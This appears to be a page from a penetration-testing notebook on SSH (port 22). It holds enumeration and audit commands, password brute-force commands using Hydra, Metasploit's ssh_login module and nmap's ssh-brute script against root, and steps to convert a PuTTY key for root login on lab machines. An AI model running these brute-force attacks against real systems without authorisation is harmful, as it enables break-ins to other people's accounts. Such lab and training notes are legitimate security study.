---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSH (22)

## Enumeration

Supported authentication methods.

```bash
nmap -p22 -script=ssh-auth-methods <IP>
```

## Audit

{% code overflow="wrap" %}
```bash
$ ssh-audit 192.168.0.24
# general
(gen) banner: SSH-1.99-OpenSSH_2.9p2
(gen) protocol SSH1 enabled
(gen) software: OpenSSH 2.9p2
(gen) compatibility: OpenSSH 2.5.0-6.6, Dropbear SSH 0.47-0.52
(gen) compression: enabled (zlib)

<SNIP>
```
{% endcode %}

## Brute Force

{% tabs %}
{% tab title="Hydra" %}
{% code overflow="wrap" %}
```bash
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.24:22 -t 4
```
{% endcode %}
{% endtab %}

{% tab title="Metasploit" %}
```bash
$ msfconsole -q
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_AS_PASS true
USER_AS_PASS => true
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.57.134
RHOSTS => 192.168.57.134
```
{% endtab %}

{% tab title="Nmap" %}
```bash
nmap -p 22 --script ssh-brute potato
```
{% endtab %}
{% endtabs %}

## PPK2PEM

Convert a Putty user key file (`.ppk`) to an SSH `.pem` file.

```bash
# Converting PPK to PEM
sudo puttygen key.ppk -O private-openssh -o key.pem
# Assigning the appropriate permissions
sudo chmod 600 key.pem
# Confirming permissions
ls -l key.pem
# Using public key authentication
ssh root@10.10.11.227 -i key.pem
```

For an example of the above process check [Keeper](../../boxes/easy/keeper.md#keepass-exploitation).
